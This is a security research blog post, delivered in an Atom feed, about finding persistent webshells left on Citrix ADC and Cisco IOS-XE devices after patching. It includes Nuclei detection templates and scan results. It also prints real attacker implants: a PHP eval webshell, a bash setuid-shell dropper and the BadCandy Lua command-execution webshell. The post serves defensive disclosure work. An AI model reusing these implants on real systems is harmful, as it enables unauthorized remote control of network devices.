<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.4.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" hreflang="en" /><updated>2025-06-15T23:01:38+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Disclosing.Observer</title><subtitle>Test
</subtitle><author><name>Max</name><email>mhvanderhorst@tudelft.nl</email></author><entry><title type="html">Scanning Beyond the Patch: A Public-Interest Hunt for Hidden Shells</title><link href="http://localhost:4000/2025/06/14/patching-is-not-enough-persistent-backdoors-after-the-fix.html" rel="alternate" type="text/html" title="Scanning Beyond the Patch: A Public-Interest Hunt for Hidden Shells" /><published>2025-06-14T00:00:00+02:00</published><updated>2025-06-14T00:00:00+02:00</updated><id>http://localhost:4000/2025/06/14/patching-is-not-enough-persistent-backdoors-after-the-fix</id><content type="html" xml:base="http://localhost:4000/2025/06/14/patching-is-not-enough-persistent-backdoors-after-the-fix.html"><![CDATA[<blockquote>
  <p><strong>Summary:</strong><br />
This blog explores three real-world cases—Citrix ADC (CVE-2023-3519), Cisco IOS XE (CVE-2023-20273), and Ivanti Connect Secure (CVE-2024-21893)—where patching alone failed to remove persistent backdoors from edge devices.<br />
We detail how these implants worked, how they evaded detection, and how we developed ethical scanning methods at DIVD to detect their remnants through behavioral side channels.<br />
Each case shows that compromise can survive remediation, and why defenders must look beyond patch status to detect real risk.</p>
</blockquote>

<p>On the internet’s edge, patching is no longer enough. With attack waves seemingly becoming more opportunistic, it is also important to look for signs that an edge device has already been compromised.</p>

<p>Over the past few years, I’ve notified thousands of organizations about critical vulnerabilities in their VPNs, firewalls, load balancers, and routers. Very often, the actual patching takes a while, or our notification takes some time to arrive. Some organizations may patch by themselves, wondering why the notification they received is relevant at all. They may not realize the uncomfortable truth: patching doesn’t undo compromise.</p>

<p>Attackers that target edge devices often exploit a narrow window of exposure, with <a href="https://vulncheck.com/blog/exploitation-trends-q1-2025">28.3% of vulnerabilities being exploited within a single day</a> of their CVE disclosure in 2025! Some of these exploit waves leave implants that persist even after the initial vulnerability is closed, which is why it’s so important to verify that the underlying system hasn’t been compromised.</p>

<p>The following post is about what we miss when we treat patching as the finish line and why public-interest researchers must go further: scanning not just for vulnerabilities, but for the residue of compromise.</p>

<h1 id="backdoors-after-the-fix">Backdoors after the fix</h1>
<p>Our dependency on edge devices has <a href="https://www.bls.gov/opub/btn/volume-13/remote-work-productivity.htm">drastically increased</a> since the COVID-19 pandemic, as they support the possibility to work remotely. They’re externally reachable, typically trusted by internal networks, and not always monitored with the same rigor as desktop endpoints or cloud workloads. This, among other reasons, makes edge devices a high-value target. When an attacker gets in through a zero-day or n-day vulnerability, their goal isn’t just access. It’s persistence.</p>

<p>At DIVD, we’ve seen this firsthand. In multiple investigations, such as <a href="https://blog.fox-it.com/2023/08/15/approximately-2000-citrix-netscalers-backdoored-in-mass-exploitation-campaign/amp/">DIVD-2023-00033</a>, by the time a vendor issues a patch and the admin applies it, the exploit path may be closed, but a backdoor is already installed. These aren’t theoretical risks. From simple PHP <code class="language-plaintext highlighter-rouge">eval()</code> implants to backdoors and credential stealers embedded in existing code, masked, and even re-signed by the malware itself, adversaries are developing significant capability in this area and are <a href="https://www.compliancepoint.com/cyber-security/hackers-exploiting-edge-devices-how-to-defend-your-organization/">increasingly treating</a> edge devices as a beachhead.</p>

<p>Some of these implants prevent or survive firmware updates, evade scans for Indicators of Compromise (IoCs), and blend into system components. Yet, after patching, many operators seem to stop looking. The logs are cleared, the traffic looks clean, the box is assumed safe. However, unless we actively look for signs of compromise, patching may only treat the symptom, not the infection.</p>

<h1 id="finding-what-the-patch-missed">Finding what the patch missed</h1>
<p>Despite vendors releasing patches and integrity checks, we’ve repeatedly encountered edge systems that remain compromised. This makes backdoors an interesting case for our public-interest scanning at DIVD. What follows are anonymized cases that illustrate the gap between vulnerability remediation and true system recovery, and why operators need to look further than just the vulnerability. An important discussion in this context is how to approach the backdoor ethically as I previously discussed in my post on <a href="https://disclosing.observer/2025/05/10/unsolicited-vulnerability-disclosure-ethics.html">scanning ethics</a>.</p>

<p>Not triggering any unintended behavior is essential, so the scanning methodology discussed below for each CVE does not focus on directly using the backdoor to confirm its presence. While this is possible in many cases through the use of magic bytes, keys, or HTTP parameters, focusing on side channels ensures the proportionality of the scan.</p>

<table>
  <thead>
    <tr>
      <th>Appliance</th>
      <th style="text-align: left">Vulnerability</th>
      <th style="text-align: center">Response signature</th>
      <th style="text-align: right">Scanning method</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Citrix ADC NetScaler</td>
      <td style="text-align: left">CVE-2023-3519</td>
      <td style="text-align: center">HTTP 201 on v1, empty HTTP 404 on v2.</td>
      <td style="text-align: right">Scan for HTTP 201 or empty 404 (without Content-Length) on known PHP paths.</td>
    </tr>
    <tr>
      <td>Cisco IOS-XE</td>
      <td style="text-align: left">CVE-2023-20198</td>
      <td style="text-align: center">Fake 404 Not Found page on v1, shell version or 18-character string on v2.</td>
      <td style="text-align: right">Scan by adding <code class="language-plaintext highlighter-rouge">%25</code> for the first version and checking for 404 Not Found, scanning by using the <code class="language-plaintext highlighter-rouge">logon_hash=1</code> parameter for the second version.</td>
    </tr>
    <tr>
      <td>Ivanti Connect Secure</td>
      <td style="text-align: left">CVE-2024-21893</td>
      <td style="text-align: center">HTTP 200 response on endpoint with random characters or the output of <code class="language-plaintext highlighter-rouge">uname -a</code>, expected behavior is a 404.</td>
      <td style="text-align: right">Scanning on created files by the exploit on index.txt, index1.txt, or index2.txt.</td>
    </tr>
  </tbody>
</table>

<h2 id="citrix-adc-and-netscaler-gateway---cve-2023-3519">Citrix ADC and NetScaler Gateway - CVE-2023-3519</h2>
<p>In July 2023, Citrix <a href="https://support.citrix.com/external/article?articleUrl=CTX561482-citrix-adc-and-citrix-gateway-security-bulletin-for-cve20233519-cve20233466-cve20233467&amp;language=en_US">disclosed</a> CVE-2023-3519, a critical unauthenticated Remote Code Execution vulnerability in Citrix ADC and NetScaler Gateway when configured as a gateway or AAA virtual server. The vulnerability was actively exploited in the wild at the time of disclosure.</p>

<p>To support remediation at scale, DIVD, in collaboration with Fox-IT, initiated an internet-wide scan campaign under investigation <a href="https://csirt.divd.nl/cases/DIVD-2023-00030/">DIVD-2023-00030</a> for the vulnerability and <a href="https://csirt.divd.nl/cases/DIVD-2023-00033/">DIVD-2023-00033</a> for the backdoor campaign. This was one of the first cases where I experienced how quickly attackers can establish persistence before patches are even applied.</p>

<h3 id="scanning-for-the-backdoors">Scanning for the Backdoors</h3>
<p>The first backdoor is publicly attributed to criminals. While there was nation state activity around this vulnerability, <a href="https://cloud.google.com/blog/topics/threat-intelligence/citrix-zero-day-espionage/">with a suspected Chinese threat actor spreading implants (dubbed SECRETSAUCE)</a>, our investigation focused on the criminal shell. On July 20th, 2023, implants started appearing. While the nation state shells appeared under the <code class="language-plaintext highlighter-rouge">/var/vpn/themes</code> directory, were asymmetric, and did not contain any clear mistakes, the criminal webshell did and started appearing in the <code class="language-plaintext highlighter-rouge">/logon/LogonPoint/uiareas</code> directory.</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> <span class="nb">http_response_code</span><span class="p">(</span><span class="mi">201</span><span class="p">);</span> <span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="mi">5</span><span class="p">]);</span>
</code></pre></div></div>
<p><span class="centered-text">Listing 1: Citrix Webshell version 1</span></p>

<p>This first version of the webshell (illustrated in Listing 1) was a simple PHP <code class="language-plaintext highlighter-rouge">eval</code> backdoor that returns an HTTP 201 (created) response code and passed the value of POST parameter <code class="language-plaintext highlighter-rouge">5</code> to PHP <code class="language-plaintext highlighter-rouge">eval()</code>. The mistake here is that this backdoor introduces a sidechannel: if the endpoint does not exist, it returns HTTP 404 as the response code. Due to the order of the statements, it will return HTTP 201 regardless of the <code class="language-plaintext highlighter-rouge">eval()</code> call succeeding. This allowed us to scan for HTTP 201 as the response code.</p>

<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">id</span><span class="pi">:</span> <span class="s">citrix-implant-cve-2023-3519</span>

<span class="na">info</span><span class="pi">:</span>
  <span class="na">name</span><span class="pi">:</span> <span class="s">Citrix CVE-2023-3519 Implant Scan</span>
  <span class="na">author</span><span class="pi">:</span> <span class="s">DIVD-NL</span>
  <span class="na">severity</span><span class="pi">:</span> <span class="s">critical</span>

<span class="na">http</span><span class="pi">:</span>
  <span class="pi">-</span> <span class="na">method</span><span class="pi">:</span> <span class="s">POST</span>
    <span class="na">path</span><span class="pi">:</span>
      <span class="pi">-</span> <span class="s2">"</span><span class="s">{{BaseURL}}/logon/LogonPoint/uiareas/{{uri}}"</span>
    
    <span class="na">payloads</span><span class="pi">:</span>
      <span class="na">uri</span><span class="pi">:</span>
        <span class="pi">-</span> <span class="s2">"</span><span class="s">{{filename:common_php_filenames.txt}}"</span>

    <span class="na">matchers</span><span class="pi">:</span>
      <span class="pi">-</span> <span class="na">type</span><span class="pi">:</span> <span class="s">status</span>
        <span class="na">status</span><span class="pi">:</span>
          <span class="pi">-</span> <span class="m">201</span>
</code></pre></div></div>
<p><span class="centered-text">Listing 2: Nuclei scanning template for the Citrix Webshells</span></p>

<p>This backdoor was included under filenames that match the most <a href="https://gitlab.com/kalilinux/packages/seclists/blob/b83a756bb2c06f94c03e525326e8480981b58a9c/Discovery/Web-Content/Common-PHP-Filenames.txt">common PHP filenames</a>, among which <code class="language-plaintext highlighter-rouge">prod.php</code>, <code class="language-plaintext highlighter-rouge">log.php</code>, <code class="language-plaintext highlighter-rouge">logout.php</code>. This allowed us to iterate over the list of filenames and query the target system for the presence of the backdoor. The downside of this is that, given each system would have to accept a few thousand requests from us, we had to diffuse scan targets and scan over a prolonged time as to not overwhelm systems with our scanning. The scan template is shown in Listing 2.</p>

<p>On July 21st, however, the implant moved. There was a sudden drop in vulnerable devices as the old implants seemed to have been used to deploy a newer, more ‘sophisticated’ implant. As shown in Listing 3, instead of returning an HTTP 201 response, the implant now returns an empty HTTP 404 and introduced a key to the <code class="language-plaintext highlighter-rouge">eval()</code> call. This functions as a basic authentication mechanism.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cp</span> /bin/sh /var/nss <span class="o">&amp;&amp;</span> <span class="nb">chmod</span> +s /var/nss <span class="o">&amp;&amp;</span> <span class="nb">mkdir</span> /netscaler/ns_gui/epa/scripts/[redacted]<span class="p">;</span> 
<span class="nb">echo</span> <span class="s1">'&lt;?php  http_response_code(404); @eval($_POST[redacted]);'</span> <span class="o">&gt;</span> 
/netscaler/ns_gui/epa/scripts/[redacted]/[redacted].php
</code></pre></div></div>
<p><span class="centered-text">Listing 3: Evolution of the Citrix Webshell to further obfuscate</span></p>

<p>The same mistake as with the previous implant was repeated here, though. Returning an empty HTTP 404 response is atypical for Citrix software. It typically returns an HTTP 302 or at least contains some headers (in particular a Content-Length header). So this time, we could scan for that. This led us to refine the scanning template for 404 anomalies (Listing 4).</p>

<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">id</span><span class="pi">:</span> <span class="s">citrix-implant-cve-2023-3519-v2</span>

<span class="na">info</span><span class="pi">:</span>
  <span class="na">name</span><span class="pi">:</span> <span class="s">Citrix CVE-2023-3519 Implant Scan - v2</span>
  <span class="na">author</span><span class="pi">:</span> <span class="s">DIVD-NL</span>
  <span class="na">severity</span><span class="pi">:</span> <span class="s">critical</span>

<span class="na">http</span><span class="pi">:</span>
  <span class="pi">-</span> <span class="na">method</span><span class="pi">:</span> <span class="s">POST</span>
    <span class="na">path</span><span class="pi">:</span>
      <span class="pi">-</span> <span class="s2">"</span><span class="s">{{BaseURL}}/{{uri}}"</span>
    
    <span class="na">payloads</span><span class="pi">:</span>
      <span class="na">uri</span><span class="pi">:</span>
        <span class="pi">-</span> <span class="s2">"</span><span class="s">{{filename:common_php_filenames.txt}}"</span>
    
    <span class="na">matchers-condition</span><span class="pi">:</span> <span class="s">and</span>
    <span class="na">matchers</span><span class="pi">:</span>
      <span class="pi">-</span> <span class="na">type</span><span class="pi">:</span> <span class="s">status</span>
        <span class="na">status</span><span class="pi">:</span>
          <span class="pi">-</span> <span class="m">404</span>

      <span class="pi">-</span> <span class="na">type</span><span class="pi">:</span> <span class="s">regex</span>
        <span class="na">part</span><span class="pi">:</span> <span class="s">header</span>
        <span class="na">negative</span><span class="pi">:</span> <span class="kc">true</span>
        <span class="na">regex</span><span class="pi">:</span>
          <span class="pi">-</span> <span class="s1">'</span><span class="s">Content-Length:'</span>
</code></pre></div></div>
<p><span class="centered-text">Listing 4: Nuclei scanning template for the updated Citrix Webshells</span></p>

<h3 id="results-increasing-global-overview-with-759">Results: increasing global overview with 759%</h3>
<p>Together with Fox-IT, we scanned 264.000 IP addresses. Of these IPs, 31.127 Citrix hosts were vulnerable at that time. Of these 31.127 vulnerable hosts, we found 2491 implants worldwide, nearly eight times more than were previously known. As Figure 1 shows, Europe and Asia were popular in particular. Through collaboration with various channels such as The Shadowserver Foundation, government CSIRTs, and directly notifying, we could decrease the number of backdoors steadily over the months after.</p>

<figure class="centered-img">
  <img style="margin:auto; display:block; padding:10px; max-width:79%;" src="../../../assets/backdoored-top-20-citrix.png" alt="VEP Process" />
  <figcaption style="text-align:center;">Figure 1: Fox-IT numbers of backdoored instances, source: NCC Group</figcaption>
</figure>

<h2 id="cisco-ios-xe---cve-2023-20273">Cisco IOS-XE - CVE-2023-20273</h2>
<p>In late September 2023, Cisco disclosed CVE-2023-20198, a critical unauthenticated Remote Code Execution vulnerability affecting the Web UI of Cisco IOS-XE devices. The bug allowed attackers to create privileged user accounts without authentication, often as a precursor to installing a persistent implant via the vulnerability. Once deployed, the implant allowed arbitrary command execution over HTTPS and could persist across reboots in some of the cases.</p>

<p>This vulnerability saw an explosive amount of exploit activity as well, with a threat actor installing the BadCandy malware on a global scale. DIVD scanned for these implants under investigation <a href="https://csirt.divd.nl/cases/DIVD-2023-00038/">DIVD-2023-00038</a>.</p>

<h3 id="scanning-for-the-backdoors-1">Scanning for the Backdoors</h3>
<p>The implant installed using this vulnerability, called BadCandy, is a bit more complex than the previous implants. BadCandy is a Lua-based webshell and consists of 29 lines of code that facilitate arbitrary command execution and is disguised as an Nginx configuration. The attacker can use the webshell by creating HTTP POST requests the <code class="language-plaintext highlighter-rouge">/webui/logoutconfirm.html</code> endpoint.</p>

<div class="language-lua highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">location</span> <span class="o">/</span><span class="n">webui</span><span class="o">/</span><span class="n">logoutconfirm</span><span class="p">.</span><span class="n">html</span> <span class="p">{</span>
    <span class="n">add_header</span> <span class="n">Content</span><span class="o">-</span><span class="n">Type</span> <span class="n">text</span><span class="o">/</span><span class="n">html</span><span class="p">;</span>	
    <span class="n">add_header</span> <span class="n">Cache</span><span class="o">-</span><span class="n">Control</span> <span class="s1">'no-cache, no-store, must-revalidate'</span><span class="p">;</span>
    <span class="n">add_header</span> <span class="n">Pragma</span> <span class="n">no</span><span class="o">-</span><span class="n">cache</span><span class="p">;</span>
    <span class="n">add_header</span> <span class="n">Strict</span><span class="o">-</span><span class="n">Transport</span><span class="o">-</span><span class="n">Security</span> <span class="s2">"max-age=31536000; includeSubdomain"</span><span class="p">;</span>
    <span class="n">content_by_lua_block</span> <span class="p">{</span>
            
            <span class="kd">local</span> <span class="n">method</span> <span class="o">=</span> <span class="n">ngx</span><span class="p">.</span><span class="n">req</span><span class="p">.</span><span class="n">get_method</span><span class="p">()</span>
            <span class="kd">local</span> <span class="n">headers</span> <span class="o">=</span> <span class="n">ngx</span><span class="p">.</span><span class="n">req</span><span class="p">.</span><span class="n">get_headers</span><span class="p">()</span>
            <span class="kd">local</span> <span class="n">params</span> <span class="o">=</span> <span class="n">ngx</span><span class="p">.</span><span class="n">req</span><span class="p">.</span><span class="n">get_uri_args</span><span class="p">()</span>
            <span class="kd">local</span> <span class="n">authorized</span> <span class="o">=</span> <span class="kc">true</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">method</span> <span class="o">==</span> <span class="s2">"POST"</span> <span class="ow">and</span> <span class="n">params</span> <span class="o">~=</span> <span class="kc">nil</span><span class="p">)</span> <span class="k">then</span>
                <span class="k">if</span> <span class="p">(</span><span class="n">headers</span><span class="p">[</span><span class="s2">"Authorization"</span><span class="p">]</span> <span class="o">~=</span> <span class="kc">nil</span> <span class="p">)</span> <span class="k">then</span>
                    <span class="kd">local</span> <span class="n">authcode</span> <span class="o">=</span> <span class="nb">string.gsub</span><span class="p">(</span><span class="n">headers</span><span class="p">[</span><span class="s2">"Authorization"</span><span class="p">],</span> <span class="s2">"^%s*(.-)%s*$"</span><span class="p">,</span> <span class="s2">"%1"</span><span class="p">)</span>
                    <span class="k">if</span> <span class="p">(</span><span class="n">authcode</span> <span class="o">~=</span> <span class="kc">nil</span> <span class="ow">and</span> <span class="nb">string.match</span><span class="p">(</span><span class="n">authcode</span><span class="p">,</span> <span class="s2">"^%w+$"</span><span class="p">)</span> <span class="o">~=</span> <span class="kc">nil</span><span class="p">)</span> <span class="k">then</span>
                        <span class="kd">local</span> <span class="n">f</span> <span class="o">=</span> <span class="nb">io.popen</span><span class="p">(</span><span class="s2">""</span><span class="p">,</span><span class="s2">"r"</span><span class="p">)</span>
                        <span class="k">if</span> <span class="p">(</span><span class="n">f</span> <span class="o">~=</span> <span class="kc">nil</span><span class="p">)</span> <span class="k">then</span>
                            <span class="kd">local</span> <span class="n">shasum</span> <span class="o">=</span> <span class="n">f</span><span class="p">:</span><span class="n">read</span><span class="p">(</span><span class="s2">"*all"</span><span class="p">)</span>
                            <span class="n">shasum</span> <span class="o">=</span> <span class="nb">string.lower</span><span class="p">(</span><span class="n">shasum</span><span class="p">)</span>
                            <span class="k">if</span> <span class="nb">string.find</span><span class="p">(</span><span class="n">shasum</span><span class="p">,</span> <span class="s2">"&lt;redacted&gt;"</span><span class="p">)</span> <span class="k">then</span>
                                <span class="n">authorized</span> <span class="o">=</span> <span class="kc">true</span>
                            <span class="k">end</span>
                            <span class="n">f</span><span class="p">:</span><span class="n">close</span><span class="p">()</span>
                        <span class="k">end</span>
                    <span class="k">end</span>
                <span class="k">end</span>
                <span class="k">if</span> <span class="p">(</span><span class="n">authorized</span> <span class="o">==</span> <span class="kc">true</span><span class="p">)</span> <span class="k">then</span>
                    <span class="n">ngx</span><span class="p">.</span><span class="n">req</span><span class="p">.</span><span class="n">read_body</span><span class="p">()</span>
                    <span class="kd">local</span> <span class="n">body</span> <span class="o">=</span> <span class="n">ngx</span><span class="p">.</span><span class="n">req</span><span class="p">.</span><span class="n">get_body_data</span><span class="p">()</span>
                    <span class="k">if</span> <span class="p">(</span><span class="n">params</span><span class="p">[</span><span class="s2">"menu"</span><span class="p">]</span> <span class="o">~=</span> <span class="kc">nil</span> <span class="ow">and</span> <span class="n">params</span><span class="p">[</span><span class="s2">"menu"</span><span class="p">]</span> <span class="o">~=</span> <span class="s2">""</span><span class="p">)</span> <span class="k">then</span>
                        <span class="n">content</span> <span class="o">=</span> <span class="s2">"/2010202301/"</span>
                    <span class="k">elseif</span> <span class="p">(</span><span class="n">params</span><span class="p">[</span><span class="s2">"logon_hash"</span><span class="p">]</span> <span class="o">~=</span> <span class="kc">nil</span> <span class="ow">and</span> <span class="n">params</span><span class="p">[</span><span class="s2">"logon_hash"</span><span class="p">]</span> <span class="o">==</span> <span class="s2">"1"</span><span class="p">)</span> <span class="k">then</span>
                        <span class="n">content</span> <span class="o">=</span> <span class="s2">"&lt;redacted&gt;"</span>
                    <span class="k">elseif</span> <span class="p">(</span><span class="n">params</span><span class="p">[</span><span class="s2">"logon_hash"</span><span class="p">]</span> <span class="o">~=</span> <span class="n">niL</span> <span class="ow">and</span> <span class="n">params</span><span class="p">[</span><span class="s2">"logon_hash"</span><span class="p">]</span> <span class="o">==</span> <span class="s2">"&lt;redacted&gt;&gt;"</span> <span class="ow">and</span> <span class="n">params</span><span class="p">[</span><span class="s2">"common_type"</span><span class="p">]</span> <span class="o">~=</span> <span class="kc">nil</span><span class="p">)</span> <span class="k">then</span>
                        <span class="k">if</span> <span class="p">(</span><span class="n">params</span><span class="p">[</span><span class="s2">"common_type"</span><span class="p">]</span> <span class="o">==</span> <span class="s2">"subsystem"</span><span class="p">)</span> <span class="k">then</span>
                            <span class="kd">local</span> <span class="n">f</span> <span class="o">=</span> <span class="nb">io.popen</span><span class="p">(</span><span class="n">body</span><span class="p">,</span> <span class="s2">"r"</span><span class="p">)</span>
                            <span class="k">if</span> <span class="p">(</span><span class="n">f</span> <span class="o">~=</span> <span class="kc">nil</span><span class="p">)</span> <span class="k">then</span>
                                <span class="n">content</span> <span class="o">=</span> <span class="n">f</span><span class="p">:</span><span class="n">read</span><span class="p">(</span><span class="s2">"*all"</span><span class="p">)</span>
                                <span class="n">f</span><span class="p">:</span><span class="n">close</span><span class="p">()</span>
                            <span class="k">end</span>
                        <span class="k">elseif</span> <span class="p">(</span><span class="n">params</span><span class="p">[</span><span class="s2">"common_type"</span><span class="p">]</span> <span class="o">==</span> <span class="s2">"iox"</span><span class="p">)</span> <span class="k">then</span>
                            <span class="n">ngx</span><span class="p">.</span><span class="n">req</span><span class="p">.</span><span class="n">set_header</span><span class="p">(</span><span class="s2">"Priv-Level"</span><span class="p">,</span> <span class="s2">"15"</span><span class="p">)</span>
                            <span class="kd">local</span> <span class="n">result</span> <span class="o">=</span> <span class="n">ngx</span><span class="p">.</span><span class="n">location</span><span class="p">.</span><span class="n">capture</span><span class="p">(</span><span class="s2">"*/luas"</span><span class="p">,</span> <span class="p">{</span><span class="n">method</span><span class="o">=</span><span class="n">ngx</span><span class="p">.</span><span class="n">HTTP_POST</span><span class="p">,</span> <span class="n">body</span><span class="o">=</span><span class="n">body</span><span class="p">})</span> 
                            <span class="kd">local</span> <span class="n">response</span> <span class="o">=</span> <span class="n">result</span><span class="p">.</span><span class="n">body</span>
                            <span class="k">if</span> <span class="ow">not</span> <span class="p">(</span><span class="n">response</span> <span class="o">==</span> <span class="kc">nil</span> <span class="ow">or</span> <span class="n">response</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="k">then</span>
                                <span class="n">content</span> <span class="o">=</span> <span class="n">response</span>
                            <span class="k">end</span>
                        <span class="k">end</span>
                    <span class="k">end</span>
                <span class="k">end</span>
            <span class="k">end</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">authorized</span> <span class="o">==</span> <span class="kc">true</span><span class="p">)</span> <span class="k">then</span>
                <span class="n">ngx</span><span class="p">.</span><span class="n">status</span> <span class="o">=</span> <span class="mi">200</span>
                <span class="n">ngx</span><span class="p">.</span><span class="n">say</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
            <span class="k">else</span>
                <span class="kd">local</span> <span class="n">result</span> <span class="o">=</span> <span class="n">ngx</span><span class="p">.</span><span class="n">location</span><span class="p">.</span><span class="n">capture</span><span class="p">(</span><span class="s2">"/internalWebui/login.html"</span><span class="p">,</span> <span class="p">{</span><span class="n">method</span> <span class="o">=</span> <span class="n">ngx</span><span class="p">.</span><span class="n">HTTP_GET</span><span class="p">})</span>
                <span class="k">if</span> <span class="n">result</span> <span class="k">then</span>
                    <span class="n">ngx</span><span class="p">.</span><span class="n">status</span> <span class="o">=</span> <span class="n">result</span><span class="p">.</span><span class="n">status</span>
                    <span class="k">if</span> <span class="n">result</span><span class="p">.</span><span class="n">body</span> <span class="k">then</span>
                        <span class="n">ngx</span><span class="p">.</span><span class="n">say</span><span class="p">(</span><span class="n">result</span><span class="p">.</span><span class="n">body</span><span class="p">)</span>
                    <span class="k">end</span>
                <span class="k">end</span>
            <span class="k">end</span>
    <span class="p">}</span> 
<span class="p">}</span>
</code></pre></div></div>
<p><span class="centered-text">Listing 5: BadCandy implant for Cisco IOS-XE - version 1</span></p>

<p>Listing 5 shows the full logic of the initial BadCandy implant, disguised as an Nginx config block. In most early instances of the backdoor, if the <code class="language-plaintext highlighter-rouge">?logon_hash=1</code> parameter is set, it will return an 18-character hexadecimal string. If the <code class="language-plaintext highlighter-rouge">common_type</code> parameter is <code class="language-plaintext highlighter-rouge">subsystem</code>, it executes the request body, and if the <code class="language-plaintext highlighter-rouge">common_type</code> parameter is <code class="language-plaintext highlighter-rouge">iox</code>, it will execute on Privilege Level 15. The <code class="language-plaintext highlighter-rouge">login_hash</code> parameter also allowed including a 40-character hash that serves as an authentication mechanism for the command execution functionality.</p>

<p>Around October 20, 2023, a second version of the implant appeared that included an additional authentication mechanism, shown in Listing 6. The second version included a preliminary check for an HTTP Authorization header. Cisco Talos <a href="https://blog.talosintelligence.com/active-exploitation-of-cisco-ios-xe-software/">suspected at the time</a> that this was a reactive measure to prevent the identification of compromised systems. Later, a third version of the BadCandy implant would include an additional check for a <code class="language-plaintext highlighter-rouge">X-Csrf-Token</code> HTTP header in a similar fashion. Strangely enough, the third version would qualify an incoming request as authorized as long as one of the two headers would be correct.</p>

<div class="language-lua highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="k">if</span> <span class="p">(</span><span class="n">method</span> <span class="o">==</span> <span class="s2">"POST"</span> <span class="ow">and</span> <span class="n">params</span> <span class="o">~=</span> <span class="kc">nil</span><span class="p">)</span> <span class="k">then</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">headers</span><span class="p">[</span><span class="s2">"Authorization"</span><span class="p">]</span> <span class="o">~=</span> <span class="kc">nil</span> <span class="p">)</span> <span class="k">then</span>
          <span class="kd">local</span> <span class="n">authcode</span> <span class="o">=</span> <span class="nb">string.gsub</span><span class="p">(</span><span class="n">headers</span><span class="p">[</span><span class="s2">"Authorization"</span><span class="p">],</span> <span class="s2">"^%s*(.-)%s*$"</span><span class="p">,</span> <span class="s2">"%1"</span><span class="p">)</span>
          <span class="k">if</span> <span class="p">(</span><span class="n">authcode</span> <span class="o">~=</span> <span class="kc">nil</span> <span class="ow">and</span> <span class="nb">string.match</span><span class="p">(</span><span class="n">authcode</span><span class="p">,</span> <span class="s2">"^%w+$"</span><span class="p">)</span> <span class="o">~=</span> <span class="kc">nil</span><span class="p">)</span> <span class="k">then</span>
              <span class="kd">local</span> <span class="n">f</span> <span class="o">=</span> <span class="nb">io.popen</span><span class="p">(</span><span class="s2">""</span><span class="p">,</span><span class="s2">"r"</span><span class="p">)</span>
              <span class="k">if</span> <span class="p">(</span><span class="n">f</span> <span class="o">~=</span> <span class="kc">nil</span><span class="p">)</span> <span class="k">then</span>
                  <span class="kd">local</span> <span class="n">shasum</span> <span class="o">=</span> <span class="n">f</span><span class="p">:</span><span class="n">read</span><span class="p">(</span><span class="s2">"*all"</span><span class="p">)</span>
                  <span class="n">shasum</span> <span class="o">=</span> <span class="nb">string.lower</span><span class="p">(</span><span class="n">shasum</span><span class="p">)</span>
                  <span class="k">if</span> <span class="nb">string.find</span><span class="p">(</span><span class="n">shasum</span><span class="p">,</span> <span class="s2">"&lt;redacted&gt;"</span><span class="p">)</span> <span class="k">then</span>
                      <span class="n">authorized</span> <span class="o">=</span> <span class="kc">true</span>
                  <span class="k">end</span>
                  <span class="n">f</span><span class="p">:</span><span class="n">close</span><span class="p">()</span>
              <span class="k">end</span>
          <span class="k">end</span>
      <span class="k">end</span>
</code></pre></div></div>
<p><span class="centered-text">Listing 6: Introduced Authorization header mechanism to BadCandy</span></p>

<p>After the Proof of Concept (POC) exploit became public on October 30th, exploitation attempts skyrocketed. Most of these attacks were opportunistic, as is common with popular POCs. A generic way of probing systems for the implant without interacting with the backdoor’s core functionality is to make a request to the uri <code class="language-plaintext highlighter-rouge">/%25</code> on the system (as shown in Listing 7). If the implant is listening, it will return an HTTP 404 response (or a decoy login page in the third version). This is what we used at DIVD to scan for compromised devices with the below template. Scanning for the <code class="language-plaintext highlighter-rouge">/webui/logoutconfirm.html</code> endpoint was not an option, as we did not want to interact with the implant’s core functionality and accidentally trigger any unintended effects.</p>

<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">id</span><span class="pi">:</span> <span class="s">cisco-ios-implant-detection-CVE-2023-20273</span>
<span class="na">info</span><span class="pi">:</span>
  <span class="na">name</span><span class="pi">:</span> <span class="s">Cisco IOS-XE Mass Exploitation CVE-2023-20273</span>
  <span class="na">author</span><span class="pi">:</span> <span class="s">DIVD-NL</span>
  <span class="na">severity</span><span class="pi">:</span> <span class="s">critical</span>

<span class="na">http</span><span class="pi">:</span>
  <span class="pi">-</span> <span class="na">method</span><span class="pi">:</span> <span class="s">POST</span>
    <span class="na">path</span><span class="pi">:</span>
      <span class="pi">-</span> <span class="s2">"</span><span class="s">{{BaseURL}}/%25"</span>

    <span class="na">matchers</span><span class="pi">:</span>
      <span class="pi">-</span> <span class="na">type</span><span class="pi">:</span> <span class="s">word</span>
        <span class="na">words</span><span class="pi">:</span>
          <span class="pi">-</span> <span class="s2">"</span><span class="s">&lt;head&gt;&lt;title&gt;404</span><span class="nv"> </span><span class="s">Not</span><span class="nv"> </span><span class="s">Found&lt;/title&gt;&lt;/head&gt;"</span>
</code></pre></div></div>
<p><span class="centered-text">Listing 7: Nuclei scanning template to detect BadCandy implants</span></p>

